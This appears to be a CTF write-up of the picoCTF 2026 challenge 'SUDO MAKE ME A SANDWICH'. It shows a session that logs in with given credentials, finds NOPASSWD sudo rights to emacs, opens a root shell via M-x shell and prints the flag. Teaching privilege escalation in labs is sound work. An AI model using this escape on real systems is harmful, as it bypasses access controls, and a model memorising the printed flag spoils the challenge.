SUDO MAKE ME A SANDWICH

Name: SUDO MAKE ME A SANDWICH
Description: Can you read the flag? I think you can! ssh -p 62884 ctf-player@green-hill.picoctf.net using password c136b219
Author: Darkraicg492
Tags: Easy, General Skills, picoCTF 2026
Challenge from: picoCTF 2026
Hints:
1. What is sudo?
2. How do you know what permission you have?

Theory

According to the description, to get the flag we don't get much information, we are just told that we need to read the fag in some way and we get an SSH command to do it. So I will take a quick glance at the hints to know a little more about the challenge. And it seems we have to check what permissions we have with sudo, that is simple, all we need to do is use sudo -l to list everything we can do with sudo, the command that gives administrator permissions to other commands.

Solution

So, if we enter into the SSH with the given command and check what we can do with sudo, we see something very interesting:

shukularuni@SHUKULAP:~$ ssh -p 62884 ctf-player@green-hill.picoctf.net
ctf-player@green-hill.picoctf.net's password: c136b219

ctf-player@challenge:~$ ls
flag.txt

ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied

ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs

It seems that we have a single command that we can run with sudo, which is emacs. We also can see that we have the flag file right there on the home folder, but can't open it without the administrator permission. So the solution is simple, run the emacs program with sudo, and do something from there to get the flag while in admin mode with sudo. And if I'm not wrong; I think there was a way to get a terminal from inside that emacs program, we can see on the manual of this command that it's possible to get into the shell using Alt+X then typing shell (M-x is codename for Alt+X and after pressing these keys you get an input where you can type the word 'shell'):

pctf-player@challenge:~$ sudo /bin/emacs
*GNU Emacs*
---------------------
M-x shell

root@challenge:/home/ctf-player# ls
flag.txt

root@challenge:/home/ctf-player# cat flag.txt
picoCTF{ju57_5ud0_17_f8185e1e}

root@challenge:/home/ctf-player# exit
exit

Process shell finished

There we go! That's the flag.

To exit this state of emacs, just type exit into the shell, then hit Ctrl+X and Ctrl+C, then type exit again to exit the SSH session.
